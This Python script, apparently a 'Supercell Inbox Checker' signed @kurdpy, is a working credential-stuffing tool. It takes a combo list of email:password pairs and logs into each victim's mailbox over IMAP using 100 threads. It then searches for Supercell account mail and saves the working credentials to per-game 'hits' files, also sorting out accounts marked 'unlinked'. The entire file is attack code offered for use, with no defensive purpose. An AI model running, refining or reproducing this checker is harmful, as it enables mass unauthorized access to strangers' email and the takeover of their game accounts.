import imaplib, email, sys, re, time, threading, os
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init

init(autoreset=True)

# ALL Supercell Games
game_choices = [
    "All Games",  # New option to check all games
    "Clash of Clans",
    "Clash Royale", 
    "Brawl Stars",
    "Hay Day",
    "Squad Busters",
    "Boom Beach",
    "Clash Quest",
    "Clash Mini",
    "Rush Wars",
    "Everdale",
    "Smash Land",
    "Spooky Pop",
    "Pets vs Orcs",
    "Battle Buddies",
    "Gunshine",
    "Radiant"
]

# Game stats dictionary to store statistics for each game
game_stats = {game: 0 for game in game_choices[1:]}  # Exclude "All Games" from stats

def game_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "╔══════════════════════════════════════════════════════╗")
    print("║           Supercell Inbox Checker                    ║")
    print("╠══════════════════════════════════════════════════════╣")
    
    # Display all game choices with current stats
    for idx, game in enumerate(game_choices, 1):
        if game == "All Games":
            total_hits = sum(game_stats.values())
            status_symbol = f"[{Fore.YELLOW}⚡{Fore.WHITE}]"
            print(Fore.WHITE + f"║  {idx:2d}. {status_symbol} {game:<20} | {total_hits:<4} ║")
        else:
            stat = game_stats.get(game, 0)
            status_symbol = f"[{Fore.RED}×{Fore.WHITE}]" if stat == 0 else f"[{Fore.GREEN}✓{Fore.WHITE}]"
            print(Fore.WHITE + f"║  {idx:2d}. {status_symbol} {game:<20} | {stat:<4} ║")
    
    print(Fore.CYAN + "╚══════════════════════════════════════════════════════╝")
    choice = input(Fore.YELLOW + "\n[+] Enter your choice (1-" + str(len(game_choices)) + "): ")
    try:
        choice_num = int(choice)
        if 1 <= choice_num <= len(game_choices):
            selected_game = game_choices[choice_num-1]
            return selected_game
        else:
            print(Fore.RED + f"[×] Invalid choice. Please enter 1-{len(game_choices)}.")
            sys.exit()
    except:
        print(Fore.RED + "[×] Invalid choice. Exiting.")
        sys.exit()

# User chooses game and combo
SelectedGame = game_menu()
combo_path = input(Fore.GREEN + "[✓] Enter combo file path: ")

# Config
shadowWorker = 100  # Reduced for all games checking
h1 = b1 = u1 = 0
lock = threading.Lock()
shadowSearch = "noreply@id.supercell.com"
keywords_unlinked = [
    "email address changed", "adresse email changée", "email adresse geändert",
    "cambio de dirección de correo", "メールアドレスが変更されました", "تم تغي",
    "adres e-mail promijenjena", "cambiato indirizzo email",
]

# Helper
def imap_server(email_addr):
    domain = email_addr.split('@')[1]
    return f"imap.{domain}"

def clss():
    os.system('cls' if os.name == 'nt' else 'clear')

def UpdateStatus():
    while True:
        clss()
        if SelectedGame == "All Games":
            print(Fore.MAGENTA + "╔══════════════════════════════════════════════════════════════╗")
            print(Fore.MAGENTA + f"║     @kurdpy | Checking: {Fore.YELLOW}ALL GAMES{Fore.MAGENTA:<35} ║")
            print(Fore.MAGENTA + "╠══════════════════════════════════════════════════════════════╣")
        else:
            print(Fore.MAGENTA + "╔══════════════════════════════════════════════════════════════╗")
            print(Fore.MAGENTA + f"║     @kurdpy | Currently Checking: {SelectedGame:<25} ║")
            print(Fore.MAGENTA + "╠══════════════════════════════════════════════════════════════╣")
        
        print(f"║ {Fore.GREEN}Total Hits: {h1:<6} {Fore.RED}| Bad: {b1:<6} {Fore.YELLOW}| Unlinked: {u1:<6} {Fore.MAGENTA}             ║")
        print(Fore.MAGENTA + "╠══════════════════════════════════════════════════════════════╣")
        print(Fore.CYAN + "║                    ALL GAME STATISTICS                        ║")
        print(Fore.MAGENTA + "╠══════════════════════════════════════════════════════════════╣")
        
        # Display all game statistics in your requested format
        games_per_column = (len(game_choices[1:]) + 1) // 2  # Exclude "All Games"
        
        for i in range(games_per_column):
            left_idx = i
            right_idx = i + games_per_column
            
            # Left column game
            if left_idx < len(game_choices[1:]):
                game_left = game_choices[1:][left_idx]
                stat_left = game_stats.get(game_left, 0)
                display_left = f"{Fore.WHITE}[×] {game_left:<15} | {stat_left:<4}"
                if stat_left > 0:
                    display_left = f"{Fore.GREEN}[✓]{Fore.WHITE} {game_left:<15} | {stat_left:<4}"
            else:
                display_left = " " * 30
            
            # Right column game
            if right_idx < len(game_choices[1:]):
                game_right = game_choices[1:][right_idx]
                stat_right = game_stats.get(game_right, 0)
                display_right = f"{Fore.WHITE}[×] {game_right:<15} | {stat_right:<4}"
                if stat_right > 0:
                    display_right = f"{Fore.GREEN}[✓]{Fore.WHITE} {game_right:<15} | {stat_right:<4}"
            else:
                display_right = ""
            
            print(f"║  {display_left:<30}   {display_right:<30} ║")
        
        print(Fore.MAGENTA + "╚══════════════════════════════════════════════════════════════╝")
        time.sleep(1)

def CheckLogin(account):
    global h1, b1, u1
    try:
        email_addr, password = account.strip().split(":")
    except:
        return
    
    try:
        mail = imaplib.IMAP4_SSL(imap_server(email_addr))
        mail.login(email_addr, password)
        mail.select("INBOX")
        result, data = mail.search(None, f'FROM "{shadowSearch}"')
        email_ids = data[0].split()
        is_unlinked = False
        
        # List to store found games for this account
        found_games = []
        
        for e_id in email_ids:
            _, msg_data = mail.fetch(e_id, "(RFC822)")
            raw = msg_data[0][1]
            msg = email.message_from_bytes(raw)
            subject = msg["Subject"] or ""
            body = ""
            
            if msg.is_multipart():
                for part in msg.walk():
                    if part.get_content_type() == "text/plain":
                        body += part.get_payload(decode=True).decode(errors="ignore")
            else:
                body = msg.get_payload(decode=True).decode(errors="ignore")

            # Check for unlinked first
            for keyword in keywords_unlinked:
                if re.search(keyword, subject, re.IGNORECASE) or re.search(keyword, body, re.IGNORECASE):
                    is_unlinked = True
                    break
            
            if is_unlinked:
                break
            
            # Check for games
            if SelectedGame == "All Games":
                # Check for ALL games
                for game in game_choices[1:]:  # Exclude "All Games"
                    if game.lower() in subject.lower() or game.lower() in body.lower():
                        if game not in found_games:
                            found_games.append(game)
            else:
                # Check for specific game only
                if SelectedGame.lower() in subject.lower() or SelectedGame.lower() in body.lower():
                    found_games.append(SelectedGame)

        with lock:
            if is_unlinked:
                u1 += 1
                with open("unlinked_accounts.txt", "a", encoding="utf-8") as f:
                    f.write(f"{email_addr}:{password}\n")
            elif found_games:
                for game in found_games:
                    h1 += 1
                    game_stats[game] = game_stats.get(game, 0) + 1
                    
                    # Save to game-specific file
                    filename = f"{game.replace(' ', '_')}_hits.txt"
                    with open(filename, "a", encoding="utf-8") as f:
                        f.write(f"{email_addr}:{password}\n")
                    
                    # Also save to combined file if checking all games
                    if SelectedGame == "All Games":
                        with open("all_games_combined_hits.txt", "a", encoding="utf-8") as f:
                            f.write(f"{game}: {email_addr}:{password}\n")
            else:
                b1 += 1
        
        mail.logout()
        
    except Exception as e:
        with lock:
            b1 += 1

def main():
    # Start status update thread
    status_thread = threading.Thread(target=UpdateStatus, daemon=True)
    status_thread.start()
    
    # Read combo file
    try:
        with open(combo_path, "r", encoding="utf-8", errors="ignore") as f:
            combo_list = [line.strip() for line in f if ":" in line]
    except FileNotFoundError:
        print(Fore.RED + f"[×] Combo file not found: {combo_path}")
        sys.exit()
    
    # Process accounts
    print(Fore.CYAN + f"[+] Starting check for {SelectedGame}")
    print(Fore.CYAN + f"[+] Total accounts to process: {len(combo_list)}")
    print(Fore.CYAN + f"[+] Worker threads: {shadowWorker}")
    time.sleep(2)
    
    with ThreadPoolExecutor(max_workers=shadowWorker) as exe:
        exe.map(CheckLogin, combo_list)
    
    # Final statistics display
    clss()
    print(Fore.CYAN + "╔═════════════════════════════════════════════════════════════════════╗")
    print(Fore.CYAN + "║                       FINAL STATISTICS                             ║")
    print(Fore.CYAN + "╠═════════════════════════════════════════════════════════════════════╣")
    print(f"║ {Fore.GREEN}Total Hits: {h1:<6} {Fore.RED}| Bad Accounts: {b1:<6} {Fore.YELLOW}| Unlinked: {u1:<6} {Fore.CYAN}                  ║")
    print(Fore.CYAN + "╠═════════════════════════════════════════════════════════════════════╣")
    
    if SelectedGame == "All Games":
        print(Fore.YELLOW + "║                      ALL GAMES CHECK COMPLETE                      ║")
    else:
        print(Fore.YELLOW + f"║                   {SelectedGame} CHECK COMPLETE                    ║")
    
    print(Fore.CYAN + "╠═════════════════════════════════════════════════════════════════════╣")
    print(Fore.WHITE + "║                 ALL GAME STATISTICS (Final)                       ║")
    print(Fore.CYAN + "╠═════════════════════════════════════════════════════════════════════╣")
    
    # Display all games in the exact format you requested
    for game in game_choices[1:]:  # Exclude "All Games"
        stat = game_stats.get(game, 0)
        if stat > 0:
            display = f"{Fore.GREEN}[✓]{Fore.WHITE} {game:<20} | {stat:<4}"
        else:
            display = f"{Fore.RED}[×]{Fore.WHITE} {game:<20} | {stat:<4}"
        print(f"║  {display:<45} ║")
    
    print(Fore.CYAN + "╚═════════════════════════════════════════════════════════════════════╝")
    
    # Save final stats to file
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    stats_file = f"game_stats_{timestamp}.txt"
    
    with open(stats_file, "w", encoding="utf-8") as f:
        f.write("SUPERCELL ALL GAMES STATISTICS SUMMARY\n")
        f.write("=" * 60 + "\n")
        f.write(f"Check Mode: {'ALL GAMES' if SelectedGame == 'All Games' else SelectedGame}\n")
        f.write(f"Check Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total Accounts Processed: {len(combo_list)}\n")
        f.write(f"Total Game Hits: {h1}\n")
        f.write(f"Bad Accounts: {b1}\n")
        f.write(f"Unlinked Accounts: {u1}\n")
        f.write("-" * 60 + "\n")
        f.write("GAME-WISE STATISTICS (Format: [×] Game Name | Count):\n")
        f.write("-" * 60 + "\n")
        
        for game in game_choices[1:]:  # Exclude "All Games"
            stat = game_stats.get(game, 0)
            symbol = "✓" if stat > 0 else "×"
            f.write(f"[{symbol}] {game} | {stat}\n")
        
        f.write("-" * 60 + "\n")
        f.write("Files Created:\n")
        for game in game_choices[1:]:
            if game_stats.get(game, 0) > 0:
                f.write(f"- {game.replace(' ', '_')}_hits.txt\n")
        
        if SelectedGame == "All Games":
            f.write("- all_games_combined_hits.txt\n")
            f.write("- unlinked_accounts.txt\n")
    
    print(Fore.GREEN + f"\n[✓] Statistics saved to: {stats_file}")
    
    # Show created files
    print(Fore.CYAN + "\n[+] Created files:")
    for game in game_choices[1:]:
        if game_stats.get(game, 0) > 0:
            print(Fore.WHITE + f"  - {game.replace(' ', '_')}_hits.txt")
    
    if SelectedGame == "All Games":
        print(Fore.WHITE + "  - all_games_combined_hits.txt")
        print(Fore.WHITE + "  - unlinked_accounts.txt")

if __name__ == "__main__":
    main()